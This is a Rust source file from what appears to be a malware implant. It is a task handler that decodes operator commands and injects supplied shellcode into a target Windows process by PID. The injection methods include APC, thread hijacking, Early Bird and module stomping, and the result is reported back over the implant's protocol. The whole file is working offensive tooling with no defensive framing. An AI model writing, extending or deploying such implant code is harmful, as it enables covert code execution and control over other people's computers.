//! Injection task handler
//!
//! Handles the "inject" task type by delegating to mod-inject.

use crate::error::{ImplantError, ImplantResult};
use protocol::{InjectTask, InjectResult};

/// Execute an injection task
pub fn execute_inject_module(task_data: &[u8]) -> ImplantResult<Vec<u8>> {
    let task: InjectTask = protocol::decode(task_data)
        .map_err(|e| ImplantError::Task(format!("failed to decode InjectTask: {}", e)))?;

    #[cfg(windows)]
    {
        use mod_inject::{inject, InjectionMethod as ModMethod};

        // Map proto InjectionMethod to mod-inject InjectionMethod
        let method = match task.method() {
            protocol::InjectionMethod::Unspecified |
            protocol::InjectionMethod::Auto => ModMethod::Auto,
            protocol::InjectionMethod::Win32 => ModMethod::Win32,
            protocol::InjectionMethod::NtApi => ModMethod::NtApi,
            protocol::InjectionMethod::Apc => ModMethod::Apc,
            protocol::InjectionMethod::ThreadHijack => ModMethod::ThreadHijack,
            protocol::InjectionMethod::EarlyBird => ModMethod::EarlyBird,
            protocol::InjectionMethod::ModuleStomping => ModMethod::ModuleStomping,
        };

        match inject(
            task.target_pid,
            &task.shellcode,
            method,
            task.wait,
            task.timeout_ms,
        ) {
            Ok(result) => {
                let response = InjectResult {
                    success: result.success,
                    thread_id: result.thread_id.unwrap_or(0),
                    technique_used: result.technique_used,
                    error: result.error,
                };
                Ok(protocol::encode(&response))
            }
            Err(e) => {
                let response = InjectResult {
                    success: false,
                    thread_id: 0,
                    technique_used: String::new(),
                    error: Some(e.to_string()),
                };
                Ok(protocol::encode(&response))
            }
        }
    }

    #[cfg(not(windows))]
    {
        let response = InjectResult {
            success: false,
            thread_id: 0,
            technique_used: String::new(),
            error: Some("injection only supported on Windows".into()),
        };
        Ok(protocol::encode(&response))
    }
}
